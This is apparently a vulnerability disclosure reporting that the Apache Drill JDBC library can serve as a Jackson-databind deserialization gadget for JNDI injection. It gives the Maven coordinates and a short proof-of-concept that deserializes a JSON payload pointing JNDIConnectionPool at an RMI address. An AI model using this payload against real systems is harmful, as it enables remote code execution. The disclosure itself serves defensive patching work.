Reporter: Topsec(tcc) from Alphalab Security Team
Received: 2020-04-15
---------------------------------------------------------------------------

'drill-jdbc-all.jar' is not in the blacklist of the latest version (2.9.10.4).
It can be used with JNDI injection. 

Add 'drill-jdbc-all.jar' to the project:
apache.drill.exec/drill-jdbc-all
   https://mvnrepository.com/artifact/org.
   https://repo1.maven.org/maven2/org/apache/drill/exec/drill-jdbc-all/1.4.0/drill-jdbc-all-1.4.0.jar 

Maven is configured like this:
 
<dependency>
  <groupId>org.apache.drill.exec</groupId>
  <artifactId>drill-jdbc-all</artifactId>
  <version>1.4.0</version>
</dependency>

TODO:

Check also

- (versions 1.1.0 - 1.17.0)
- https://mvnrepository.com/artifact/org.apache.drill.exec/drill-java-exec
- https://mvnrepository.com/artifact/org.apache.drill.exec/drill-jdbc
- https://mvnrepository.com/artifact/org.apache.drill.exec/drill-rpc

Test code: 

public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    String json = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",
    {\"jndiPath\":\"rmi://127.0.0.1:1099/calc\"}]";
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
}
